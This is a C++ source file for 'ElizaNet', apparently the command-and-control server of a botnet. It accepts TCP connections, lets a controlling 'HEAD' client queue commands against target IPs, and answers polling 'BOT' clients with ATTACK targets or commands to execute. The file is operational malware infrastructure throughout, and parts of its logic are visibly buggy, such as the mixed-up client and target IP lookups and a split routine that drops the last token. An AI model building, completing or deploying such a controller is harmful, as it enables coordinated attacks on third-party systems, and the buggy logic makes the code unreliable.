#include "elizaNet.h"

void ElizaNet::setupServer(unsigned int serverPort) {
    this->serverPort = serverPort;
    
    this->sockServer = socket(AF_INET, SOCK_STREAM, 0);
    this->server.sin_family = AF_INET;
    this->server.sin_addr.s_addr = htonl(INADDR_ANY);
    this->server.sin_port = htons(serverPort);
    bind(sockServer, (struct sockaddr*)&server, sizeof(server));
}
void ElizaNet::startServer() {
    listen(sockServer, 100);
    while(1) {
        socklen_t size = sizeof(sockaddr_in);
        this->sockClient = accept(sockServer, (struct sockaddr*)&client, &size);
        std::cout << "=== Incomming connection! ===" << std::endl;
        handleClients(this->sockClient);
    }

}
void ElizaNet::stopServer() {

}
void ElizaNet::handleClients(int sock) {
    paketcount++;
    char buf[128];
    char clientIp[16];
    socklen_t len = sizeof(client);
    memset(&buf[0], 0, sizeof(buf));

    read(sock, buf, sizeof(char)*128);
    ElizaPaket *fromSender = new ElizaPaket();
    ElizaPaket *response = new ElizaPaket();
    fromSender->parsePaket(std::string(buf));
    getpeername(sock, (struct sockaddr *) &client, &len);
    inet_ntop(AF_INET, &client.sin_addr, clientIp, sizeof(clientIp));

    std::cout << "\t" << "[" << paketcount << "]" << " paket from client {" << std::endl
        << "\t\tIP: " << std::string(clientIp) << std::endl
        << "\t\tSendertype: " << fromSender->senderTypeToString() << std::endl 
        << "\t\tMessagetype: " << fromSender->messageTypeToString() << std::endl
        << "\t\tMessage: " << fromSender->getMessage() << std::endl
        << "\t}" << std::endl << std::endl;

    if(fromSender->getSenderType() == SenderType::HEAD) {
        response = this->handleHead(fromSender);
        
    }
    else if(fromSender->getSenderType() == SenderType::BOT) {
        response = this->handleBot(fromSender, std::string(clientIp));
    }
    write(sock, (char *)response->toNetworkPaket().c_str(), strlen((char *)response->toNetworkPaket().c_str()));
    close(sock);
}

std::vector<std::string> ElizaNet::split(std::string s, std::string delimiter) {
    std::vector<std::string> splitVec;
    size_t pos = 0;
    std::string token;
    while ((pos = s.find(delimiter)) != std::string::npos) {
        token = s.substr(0, pos);
        splitVec.push_back(token);
        s.erase(0, pos + delimiter.length());
    }
    return splitVec;
}

ElizaPaket* ElizaNet::handleHead(ElizaPaket* fromServer) {
    ElizaPaket* response = new ElizaPaket();
    if(fromServer->getMessageType() == MessageType::COMMAND) {
        std::vector<std::string> cmd = this->split(fromServer->getMessage(), " ");
        this->targetIp = cmd[0];
        for(int i = 1; i < cmd.size(); i++) {
            if(i == cmd.size() - 1) {
                this->targetCommand += cmd[i];
            }
            else {
                this->targetCommand += cmd[i] + " ";
            }
        }
        this->commandMap[targetIp] = this->targetCommand;
        response->createPaket(SenderType::SERVER, MessageType::GENERIC, "CMDRECIEVED");
        this->targetCommand = "";
    }
    else if(fromServer->getMessageType() == MessageType::GENERIC) {
        if(fromServer->getMessage() == "TEST") {
            response->createPaket(SenderType::SERVER, MessageType::GENERIC, "ALLOK");
        }
    }
    return response;
}
ElizaPaket* ElizaNet::handleBot(ElizaPaket* fromServer, std::string clientIp) {
    ElizaPaket* response = new ElizaPaket();
    if(fromServer->getMessageType() == MessageType::STATUS) {
        if(this->targetDefined == true) {
            response->createPaket(SenderType::SERVER, MessageType::ATTACK, targetIp);        
        }
        else if(this->commandMap.count(std::string(clientIp)) == 1) {
            response->createPaket(SenderType::SERVER, MessageType::COMMAND, commandMap[std::string(targetIp)]);
            this->commandMap.erase(std::string(targetIp));
        }
        else {
            response->createPaket(SenderType::SERVER, MessageType::GENERIC, "Nothing to do!");
        }
    }
    return response;
}